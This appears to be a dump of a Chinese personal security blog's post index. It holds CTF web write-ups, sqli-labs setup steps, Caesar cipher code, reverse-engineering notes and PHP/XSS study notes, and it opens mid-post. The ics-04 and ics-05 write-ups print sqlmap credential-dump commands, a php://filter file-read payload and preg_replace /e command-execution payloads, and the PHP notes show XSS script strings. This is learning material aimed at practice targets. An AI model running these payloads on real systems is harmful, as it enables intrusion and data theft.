templates/flag.php”);//{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码；","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Lottery!","slug":"Lottery","date":"2019-12-09T00:49:07.000Z","updated":"2019-12-30T05:27:05.568Z","comments":true,"path":"2019/12/09/Lottery/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Lottery/","excerpt":"","text":"Lottery！题目分析：随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实， 实际操作:用burpsuite对输入彩票数字验证过程抓包，得到api.php; 不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 尝试访问： 可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)打开之前下载好的源文件： 打开api.php文件，可以看到以下验证彩票数字代码： 123456789101112131415161718192021222324252627282930$win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; 可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；改包： 发现已经获得$200000;多提交几余额就够了，buy-&gt;flag；","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ics-04","slug":"ics-04","date":"2019-12-09T00:28:33.000Z","updated":"2019-12-30T05:16:00.470Z","comments":true,"path":"2019/12/09/ics-04/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/ics-04/","excerpt":"","text":"ics-04问题分析： 本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”； 尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞； 构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" --dbs 得到库名结果； 库名 对每个数据库进行表名猜解；1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 --tables 对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user --columns 对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项 1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user -C \"username,password\" --dump 由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag； 此时对username查询可得到两条结果；第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；知识补充：如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\\Python27\\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；关于sqlmap使用：https://blog.csdn.net/qq_33530840/article/details/82144515","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"sqli-labs环境搭建","slug":"sqli-labs环境搭建","date":"2019-12-02T02:01:08.000Z","updated":"2019-12-18T00:15:04.327Z","comments":true,"path":"2019/12/02/sqli-labs环境搭建/","link":"","permalink":"https://singlemindedt.github.io/2019/12/02/sqli-labs环境搭建/","excerpt":"","text":"##1.由于版本支持等问题，此次环境安装建议下载Phpstudy2018版本，解压安装(可自定义安装目录)； ##2.下载sqli-labs文件，Github下载解压至Phpstudy2018\\PHPTutorial\\WWW目录下； ##3.更改数据库密码，E:\\PhpStudy2018\\PHPTutorial\\WWW\\sqli-labs-master\\sqli-labs-master\\sql-connections\\db-creds,自己任意设置； ##4.开启Phpstudy2018的Apache和MySql服务; ##5.基本配置完成，打开http://127.0.0.1/sqli-labs-master/，若出现如下页面则搭建成功； ##6.点击Setup/reset Database for labs建立数据库连接，若出现如下页面则搭建完成；[^_^]:(sql1/images/sql1.png) ##7.访问http://127.0.0.1/sqli-labs-master/ 时，若出现You don’t have permission to access /sqli-labs-master/ on this server.；则打开Phpstudy2018的“其他选项菜单\\打开配置文件\\httpd.conf”;配置为如下情况；[^_^]: # (sql2/images/sql2.png)同时将“phpstudy设置”设置为“允许目录列表”；至此，sqli-labs环境搭建完成！","categories":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"C++/Python实现凯撒密码","slug":"凯撒密码","date":"2019-11-16T14:18:05.000Z","updated":"2019-12-17T13:18:28.419Z","comments":true,"path":"2019/11/16/凯撒密码/","link":"","permalink":"https://singlemindedt.github.io/2019/11/16/凯撒密码/","excerpt":"","text":"凯撒密码C++ 在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。 代码实现 (已知密钥情况下) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;bits/stdc++.h&gt;using namespace std;void Encryption(string C,int key,int model);//加密函数void Decryption(string M,int key,int model);//解密函数int main()&#123; string C; int key; int model; //int len;//字符串长度 while(1) &#123; cout&lt;&lt;\"Model:\"&lt;&lt;endl; cout&lt;&lt;\"1:Encry\"&lt;&lt;endl; cout&lt;&lt;\"2:Decry\"&lt;&lt;endl; cin&gt;&gt;model; if(model==1) &#123; cout&lt;&lt;\"Please enter the content to be encrypted:\"; cin&gt;&gt;C; //len=strlen(C);//错误:C需要转换为char*类型 cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Encryption(C,key,model); &#125; else if(model==2) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Decryption(C,key,model); &#125; else cout&lt;&lt;\"Error!\"&lt;&lt;endl; &#125; return 0;&#125; void Encryption(string C,int key,int model)&#123; if(model==1) &#123; for(int i=0;i&lt;C.length();i++) &#123; if(C[i]&gt;='A'&amp;&amp;C[i]&lt;='Z') C[i]='A'+(C[i]-'A'+key)%26; else if(C[i]&gt;='a'&amp;&amp;C[i]&lt;='z') C[i]='a'+(C[i]-'a'+key)%26; &#125; cout&lt;&lt;\"The result of the encryption is：\"&lt;&lt;C&lt;&lt;endl; &#125; else cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; void Decryption(string M,int key,int model)&#123; if(model==2) &#123; for(int i = 0; i &lt;M.length(); i++) &#123; if(M[i] &gt;= 'A' &amp;&amp; M[i] &lt;= 'Z') M[i] = 'A'+(M[i]-'A'-key+26)%26;//M[i]='A'+(M[i]-'A'+(26-key)) else if(M[i] &gt;= 'a' &amp;&amp; M[i] &lt;= 'z') M[i] = 'a'+(M[i]-'a'-key+26)%26;//... &#125; cout&lt;&lt;\"The result of the decryption is:\"&lt;&lt;M&lt;&lt;endl; &#125; else cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; 完整版（就是穷举了key） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include&lt;bits/stdc++.h&gt;using namespace std;void Encryption(string C,int key,int mode);//加密函数void Decryption(string M,int key,int mode);//解密函数int main()&#123; string C; int key;//偏移位 int mode; //int len;//字符串长度 while(1) &#123; cout&lt;&lt;\"Mode:(Please enter selection mode！！！)\"&lt;&lt;endl; cout&lt;&lt;\"1:Encry\"&lt;&lt;endl; cout&lt;&lt;\"2:Decry\"&lt;&lt;endl; cout&lt;&lt;\"3:Keyless Decryption\"&lt;&lt;endl; cin&gt;&gt;mode; if(mode==1) &#123; cout&lt;&lt;\"Please enter the content to be encrypted:\"; cin&gt;&gt;C; //len=strlen(C);//错误:C需要转换为char*类型 cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Encryption(C,key,mode); &#125; else if(mode==2) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Decryption(C,key,mode); &#125; else if(mode==3) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; for(int k=1;k&lt;26;k++) Decryption(C,k,mode); &#125; else cout&lt;&lt;\"Error!\"&lt;&lt;endl; &#125; return 0;&#125; void Encryption(string C,int key,int mode)&#123; //if(mode==1) //&#123; for(int i=0;i&lt;C.length();i++) &#123; if(C[i]&gt;='A'&amp;&amp;C[i]&lt;='Z') C[i]='A'+(C[i]-'A'+key)%26; else if(C[i]&gt;='a'&amp;&amp;C[i]&lt;='z') C[i]='a'+(C[i]-'a'+key)%26; &#125; cout&lt;&lt;\"The result of the encryption is：\"&lt;&lt;C&lt;&lt;endl; //&#125; //else //cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; void Decryption(string M,int key,int mode)&#123; //if(mode==2) //&#123; for(int i = 0; i &lt;M.length(); i++) &#123; if(M[i] &gt;= 'A' &amp;&amp; M[i] &lt;= 'Z') M[i] = 'A'+(M[i]-'A'-key+26)%26;//M[i]='A'+(M[i]-'A'+(26-key)) else if(M[i] &gt;= 'a' &amp;&amp; M[i] &lt;= 'z') M[i] = 'a'+(M[i]-'a'-key+26)%26;//... &#125; cout&lt;&lt;\"The result of the decryption is:\"&lt;&lt;M&lt;&lt;endl; cout&lt;&lt;endl; //&#125; // else // cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; #凯撒密码Python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#Encryptiondef Encryption(C,key,mode): C_list=list(C) C_list_encry=C_list i=0 while i&lt;len(C_list ): if(ord(C_list[i])&gt;=65 and ord(C_list[i])&lt;=90): C_list_encry[i]=chr(65+(ord(C_list[i])-65+key)%26) if (ord(C_list[i])&gt;=97 and ord(C_list[i]) &lt;= 122): C_list_encry[i] = chr(97+ (ord(C_list[i]) - 97 + key) % 26) i+=1 print(\"The result of the encryption is：\"+\"\".join(C_list_encry ))#Decryptiondef Decryption(C,key,mode): C_list = list(C) C_list_decry = C_list i = 0 while i &lt; len(C_list): if (ord(C_list[i]) &gt;= 65 and ord(C_list[i]) &lt;= 90): C_list_decry[i] = chr(65 + (ord(C_list[i])-65-key+26) % 26) if (ord(C_list[i]) &gt;= 97 and ord(C_list[i]) &lt;= 122): C_list_decry[i] = chr(97 + (ord(C_list[i]) - 97-key+26) % 26) i+=1 print(\"The result of the decryption is:\"+\"\".join(C_list_decry))#main()def main(): while(1): print(\"Mode:(Please select mode！！！)\") print(\"1:Encry\") print(\"2:Decry\") print(\"3:Keyless Decryption\") mode=input () if mode==\"1\": print(\"Please enter the content to be encrypted:\") C=input() print(\"Please enter key:\") key = int(input()) key=key%26 Encryption(C, key, mode) if mode==\"2\": print(\"Please enter the content to be decrypted:\") C=input() print(\"Please enter key :\") key=int(input()) key = key % 26 Decryption(C, key, mode) if mode==\"3\": print(\"Please enter the content to be decrypted:\") C=input() key=1 while key&lt;26: Decryption(C, key, mode) key+=1 if mode!=\"1\"and mode!=\"2\" and mode!=\"3\": print(\"Error!\")if __name__ == '__main__': main()","categories":[{"name":"密码学","slug":"密码学","permalink":"https://singlemindedt.github.io/categories/密码学/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://singlemindedt.github.io/tags/密码学/"}]},{"title":"初探栈溢出","slug":"初探栈溢出","date":"2019-10-10T14:09:17.000Z","updated":"2019-12-18T00:12:45.763Z","comments":true,"path":"2019/10/10/初探栈溢出/","link":"","permalink":"https://singlemindedt.github.io/2019/10/10/初探栈溢出/","excerpt":"","text":"这里给出一个简单的exe文件，实现的功能为：让用户键入密码，程序将之与固定密码(1234567)进行比较，如果错误继续键入，成功则提示“Congratulation! You have passed the verification!” 将程序拖入IDA，在左边窗口有函数名称列表，找到_main函数双击，可以看到其程序流程图： 伪代码： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+0h] [ebp-8h]//变量v4 while ( 1 ) &#123; sub_4010A7(aPleaseInputPas, v4);//函数sub_4010A7需要调用两个参数aPleaseInputPas, v4 scanf(aS, &amp;v4);//输入v4 if ( !sub_401000(&amp;v4) )//若sub_401000(&amp;v4)==0调用 sub_4010A7(aIncorrectPassw, v4) break; sub_4010A7(aIncorrectPassw, v4); &#125; return sub_4010A7(aCongratulation, v4);&#125; 我们接下来查看 判断函数sub_401000： 1234567891011121314int __cdecl sub_401000(const char *a1)&#123; return strcmp(a1, a1234567);&#125;/*比较两个字符串设这两个字符串为str1，str2，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。*/ 查看sub_4010A7： 12345678910int __cdecl sub_4010A7(int a1, int a2)&#123; int v2; // edi int v3; // ebx v2 = _stbuf(&amp;stru_4080E0); v3 = sub_401E34(&amp;stru_4080E0, a1, (int)&amp;a2); _ftbuf(v2, &amp;stru_4080E0); return v3;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"re","slug":"re","permalink":"https://singlemindedt.github.io/tags/re/"}]},{"title":"ics-05","slug":"ics-05","date":"2019-10-05T02:53:52.000Z","updated":"2019-12-30T05:21:27.280Z","comments":true,"path":"2019/10/05/ics-05/","link":"","permalink":"https://singlemindedt.github.io/2019/10/05/ics-05/","excerpt":"","text":"ics-05题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 实际操作：点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面： 除了index.php页面，没有其他有效信息，查看源码： 可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞； **本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:主要涉及到的函数：include(),require()、include_once(),require_once()magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;参考文章：https://blog.csdn.net/qq_29419013/article/details/81202358**尝试读取index.php的页面源码，通过php内置协议直接读取代码：?page=php://filter/read=convert.base64-encode/resource=index.php得到很长一串base64编码，解码得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;设备维护中心&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;设备列表&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- 这里的 checked 的状态只是演示 --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"开|关\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: '设备名', templet: '#nameTpl' &#125;, &#123; field: 'area', title: '区域' &#125;, &#123; field: 'status', title: '维护状态', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块 //监听导航点击 element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 源码审计，得到如下可能存在问题的关键部分： 123456789101112131415161718192021&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；**关于preg_replace：https://www.php.net/manual/zh/function.preg-replace.php**先来测试一下，看能不能输出关于PHP配置的信息； 构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’； 构造：验证成功！ 接下来尝试读取文件目录，利用system（）函数； 构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”): **%20url解释为空格、%26为&amp;** 得到flag文件，cd查看flag文件： 得到flag.php，使用cat查看内容：","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"正则表达式","slug":"正则表达式","date":"2019-10-04T06:34:42.000Z","updated":"2019-10-04T07:18:57.002Z","comments":true,"path":"2019/10/04/正则表达式/","link":"","permalink":"https://singlemindedt.github.io/2019/10/04/正则表达式/","excerpt":"","text":"https://c.runoob.com/front-end/854","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://singlemindedt.github.io/tags/正则表达式/"}]},{"title":"PHP学习","slug":"PHP学习","date":"2019-09-30T14:44:09.000Z","updated":"2019-10-03T13:33:07.472Z","comments":true,"path":"2019/09/30/PHP学习/","link":"","permalink":"https://singlemindedt.github.io/2019/09/30/PHP学习/","excerpt":"","text":"文章内容主要来自W3School，仅作为学习记录使用。 在 PHP 创建用户定义函数用户定义的函数声明以单词 “function” 开头： 语法123function functionName() &#123; 被执行的代码;&#125; 注释：函数名能够以字母或下划线开头（而非数字）。注释：函数名对大小写不敏感。提示：函数名应该能够反映函数所执行的任务。* 获得数组的长度 - count() 函数count() 函数用于返回数组的长度（元素数） 1234&lt;?php$cars=array(\"porsche\",\"BMW\",\"Volvo\");echo count($cars);?&gt; PHP 关联数组关联数组是使用您分配给数组的指定键的数组。有两种创建关联数组的方法： 12345$age=array(\"Bill\"=&gt;\"35\",\"Steve\"=&gt;\"37\",\"Elon\"=&gt;\"43\");或者：$age['Bill']=\"63\";$age['Steve']=\"56\";$age['Elon']=\"47\"; 随后可以在脚本中使用指定键： 123456&lt;?php$age=array(\"Bill\"=&gt;\"63\",\"Steve\"=&gt;\"56\",\"Elon\"=&gt;\"47\");echo \"Elon is \" . $age['Elon'] . \" years old.\";?&gt;Elon is 47 years old. PHP - 数组的排序函数在本节中，我们将学习如下 PHP 数组排序函数： 123456sort() - 以升序对数组排序rsort() - 以降序对数组排序asort() - 根据值，以升序对关联数组进行排序ksort() - 根据键，以升序对关联数组进行排序arsort() - 根据值，以降序对关联数组进行排序krsort() - 根据键，以降序对关联数组进行排序 GET vs. POSTGET 和 POST 都创建数组（例如，array( key =&gt; value, key2 =&gt; value2, key3 =&gt; value3, …)）。此数组包含键/值对，其中的键是表单控件的名称，而值是来自用户的输入数据。GET 和 POST 被视作 $_GET 和 $_POST。它们是超全局变量，这意味着对它们的访问无需考虑作用域 - 无需任何特殊代码，您能够从任何函数、类或文件访问它们。$_GET 是通过 URL 参数传递到当前脚本的变量数组。$_POST 是通过 HTTP POST 传递到当前脚本的变量数组。 何时使用 GET？通过 GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。限制在大约 2000 个字符。不过，由于变量显示在 URL 中，把页面添加到书签中也更为方便。GET 可用于发送非敏感的数据。注释：绝不能使用 GET 来发送密码或其他敏感信息！ 何时使用 POST？通过 POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中），并且对所发送信息的数量也无限制。此外 POST 支持高阶功能，比如在向服务器上传文件时进行 multi-part 二进制输入。不过，由于变量未显示在 URL 中，也就无法将页面添加到书签。提示：开发者偏爱 POST 来发送表单数据。 表单元素表单的 HTML 代码是这样的： 1&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt; 当提交此表单时，通过 method=”post” 发送表单数据。什么是 $_SERVER[“PHP_SELF”] 变量？$_SERVER[“PHP_SELF”] 是一种超全局变量，它返回当前执行脚本的文件名。因此，$_SERVER[“PHP_SELF”] 将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。 什么是 htmlspecialchars() 函数？htmlspecialchars() 函数把特殊字符转换为 HTML 实体。这意味着 &lt; 和 &gt; 之类的 HTML 字符会被替换为 &lt; 和 &gt; 。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。 关于 PHP 表单安全性的重要提示$_SERVER[“PHP_SELF”] 变量能够被黑客利用！如果您的页面使用了 PHP_SELF，用户能够输入下划线然后执行跨站点脚本（XSS）。提示：跨站点脚本（Cross-site scripting，XSS）是一种计算机安全漏洞类型，常见于 Web 应用程序。XSS 能够使攻击者向其他用户浏览的网页中输入客户端脚本。假设我们的一张名为 “test_form.php” 的页面中有如下表单： 1&lt;form method=\"post\" action=\"&lt;?php echo $_SERVER[\"PHP_SELF\"];?&gt;\"&gt; 现在，如果用户进入的是地址栏中正常的 URL：”http://www.example.com/test_form.php&quot;，上面的代码会转换为： 1&lt;form method=\"post\" action=\"test_form.php\"&gt; 到目前，一切正常。不过，如果用户在地址栏中键入了如下 URL： 1http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E 在这种情况下，上面的代码会转换为： 1&lt;form method=\"post\" action=\"test_form.php\"/&gt;&lt;script&gt;alert('hacked')&lt;/script&gt; 这段代码加入了一段脚本和一个提示命令。并且当此页面加载后，就会执行 JavaScript 代码（用户会看到一个提示框）。这仅仅是一个关于 PHP_SELF 变量如何被利用的简单无害案例。您应该意识到 标签内能够添加任何 JavaScript 代码！黑客能够把用户重定向到另一台服务器上的某个文件，该文件中的恶意代码能够更改全局变量或将表单提交到其他地址以保存用户数据，等等。如果避免 $_SERVER[\"PHP_SELF\"] 被利用？通过使用 htmlspecialchars() 函数能够避免 $_SERVER[\"PHP_SELF\"] 被利用。表单代码是这样的： 1&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt; htmlspecialchars() 函数把特殊字符转换为 HTML 实体。现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出： 1&lt;form method=\"post\" action=\"test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;\"&gt; 无法利用，没有危害！ 通过 PHP 验证表单数据我们要做的第一件事是通过 PHP 的 htmlspecialchars() 函数传递所有变量。在我们使用 htmlspecialchars() 函数后，如果用户试图在文本字段中提交以下内容： 123&lt;script&gt;location.href('http://www.hacked.com')&lt;/script&gt;- 代码不会执行，因为会被保存为转义代码，就像这样：&amp;lt;script&amp;gt;location.href('http://www.hacked.com')&amp;lt;/script&amp;gt; 现在这条代码显示在页面上或 e-mail 中是安全的。在用户提交该表单时，我们还要做两件事：（通过 PHP trim() 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）（通过 PHP stripslashes() 函数）删除用户输入数据中的反斜杠（\\）接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）。我们把函数命名为 test_input()。现在，我们能够通过 test_input() 函数检查每个 $_POST 变量，脚本是这样的： 1234567891011121314151617181920实例&lt;?php// 定义变量并设置为空值$name = $email = $gender = $comment = $website = \"\";if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; $name = test_input($_POST[\"name\"]); $email = test_input($_POST[\"email\"]); $website = test_input($_POST[\"website\"]); $comment = test_input($_POST[\"comment\"]); $gender = test_input($_POST[\"gender\"]);&#125;function test_input($data) &#123; $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data); return $data;&#125;?&gt; 请注意在脚本开头，我们检查了表单是否使用 $_SERVER[\"REQUEST_METHOD\"] 进行提交。如果 REQUEST_METHOD 是 POST，那么表单已被提交 - 并且应该对其进行验证。如果未提交，则跳过验证并显示一个空白表单。不过，在上面的例子中，所有输入字段都是可选的。即使用户未输入任何数据，脚本也能正常工作。下一步是制作必填输入字段，并创建需要时使用的错误消息。 关于正则表达式：记-正则表达式 PHP 表单验证 - 验证 E-mail 和 URLPHP - 验证名字以下代码展示的简单方法检查 name 字段是否包含字母和空格。如果 name 字段无效，则存储一条错误消息： 1234$name = test_input($_POST[\"name\"]);if (!preg_match(\"/^[a-zA-Z ]*$/\",$name)) &#123; $nameErr = \"只允许字母和空格！\"; 